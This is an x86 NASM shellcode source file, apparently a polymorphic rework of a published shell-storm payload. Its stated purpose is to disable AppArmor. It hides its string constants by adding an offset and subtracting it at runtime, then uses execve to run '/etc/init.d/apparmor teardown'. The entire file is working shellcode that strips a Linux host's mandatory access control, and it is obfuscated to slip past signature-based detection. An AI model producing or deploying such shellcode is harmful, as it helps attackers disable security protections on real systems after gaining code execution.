; Filename: 2_apparmor.nasm
; Author: Zoltan Balazs 
; Original shellcode: http://shell-storm.org/shellcode/files/shellcode-765.php

; Purpose: Disable apparmor

global _start

section .text
_start:

		push byte +0xb
		pop eax
		;xor edx,edx
		mov edx, ebx
		xor edx, ebx		

		push edx
		;push dword 0x6e776f64
    		mov esi, 0x7F888075
		sub esi, 0x11111111
    		mov dword [esp-4],esi
    		sub esp, 4

		;push dword 0x72616574
                mov esi, 0x83727685
                sub esi, 0x11111111
                mov dword [esp-4],esi
                sub esp, 4

		mov ecx,esp
		push edx

		;push dword 0x726f6d72
                mov esi, 0x83807E83
                sub esi, 0x11111111
                mov dword [esp-4],esi
                sub esp, 4

		;push dword 0x61707061
                mov esi, 0x72818172
                sub esi, 0x11111111
                mov dword [esp-4],esi
                sub esp, 4

		;push dword 0x2f642e74
                mov esi, 0x40753F85
                sub esi, 0x11111111
                mov dword [esp-4],esi
                sub esp, 4

		;push dword 0x696e692f
                mov esi, 0x7A7F7A40
                sub esi, 0x11111111
                mov dword [esp-4],esi
                sub esp, 4

		;push dword 0x6374652f
                mov esi, 0x74857640
                sub esi, 0x11111111
                mov dword [esp-4],esi
                sub esp, 4

		mov ebx,esp
		push edx
		push ecx
		push ebx
		mov ecx,esp
		int 0x80

